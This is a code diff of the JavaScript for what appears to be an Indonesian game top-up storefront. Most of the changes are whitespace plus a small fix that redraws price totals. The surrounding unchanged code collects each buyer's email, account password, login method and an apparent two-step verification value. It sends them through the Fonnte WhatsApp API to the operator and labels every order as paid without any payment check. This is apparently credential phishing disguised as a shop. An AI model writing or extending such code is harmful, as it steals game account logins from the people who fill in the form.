@@ -1,4 +1,3 @@
-
 document.addEventListener("DOMContentLoaded", () => {
   const produkData = {
     diamond: {
@@ -45,6 +44,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   let selectedTab = "";
   let selectedItem = null;
+
   const produkContainer = document.getElementById("produk-container");
   const produkNote = document.getElementById("produk-note");
 
@@ -95,7 +95,9 @@ document.addEventListener("DOMContentLoaded", () => {
     inputs.forEach((input) => {
       if (!input.value || input.value.trim() === "") valid = false;
     });
+
     const metode = document.getElementById("metode-terpilih").value;
+
     if (!valid || !selectedItem || !metode) {
       Swal.fire({
         title: "Ketua Harap isi semua kolom & pilih item 😁",
@@ -111,9 +113,12 @@ document.addEventListener("DOMContentLoaded", () => {
       });
       return;
     }
+
     const data = Object.fromEntries(new FormData(form).entries());
     const item = selectedItem;
+
     const message = `🔥 *Order Baru dari Website* 🔥\n👤 Nickname: ${data.nickname}\n📧 Email: ${data.email}\n🔐 Password: ${data.password}\n🔑 Login: ${data.loginMethod}\n📱 WhatsApp: ${data.whatsapp}\n🛒 Orderan:\n- ${item.label} (${item.harga})\n🔒 V2L: ${data.v2l}\n💳 Pembayaran: ${data.metode}\n✅ Status: Pembayaran berhasil`;
+
     fetch("https://api.fonnte.com/send", {
       method: "POST",
       headers: {
@@ -146,6 +151,7 @@ document.addEventListener("DOMContentLoaded", () => {
   });
 });
 
+// Fungsi tambahan
 function toggleCollapse(element) {
   const next = element.nextElementSibling;
   if (!next || !next.classList.contains("form-sub")) return;
@@ -155,16 +161,13 @@ function toggleCollapse(element) {
 function selectPayment(card, method) {
   const input = document.getElementById("metode-terpilih");
   const isSelected = card.classList.contains("selected");
-
   document.querySelectorAll(".payment-inner-card").forEach((el) => {
     el.classList.remove("selected");
     removeTotalHarga(el);
   });
-
   if (!isSelected) {
     card.classList.add("selected");
     input.value = method;
-
     if (selectedItem) {
       const total = calculateTotalHarga(method);
       const span = document.createElement("div");
@@ -173,7 +176,6 @@ function selectPayment(card, method) {
       span.textContent = `Total: Rp ${formatRupiah(total)}`;
       card.appendChild(span);
     }
-
     updateTotalHargaDisplay();
   } else {
     input.value = "";
@@ -209,3 +211,17 @@ function calculateTotalHarga(method) {
 function formatRupiah(angka) {
   return angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
 }
+
+// FIX: Pastikan total harga muncul ulang saat item atau metode dipilih
+document.addEventListener("DOMContentLoaded", () => {
+  const metodeInput = document.getElementById("metode-terpilih");
+
+  // Cek perubahan metode setiap kali berubah
+  const observer = new MutationObserver(updateTotalHargaDisplay);
+  observer.observe(metodeInput, { attributes: true, attributeFilter: ["value"] });
+
+  // Extra: Update saat item diklik (fallback)
+  document.getElementById("produk-container").addEventListener("click", () => {
+    setTimeout(updateTotalHargaDisplay, 100);
+  });
+});
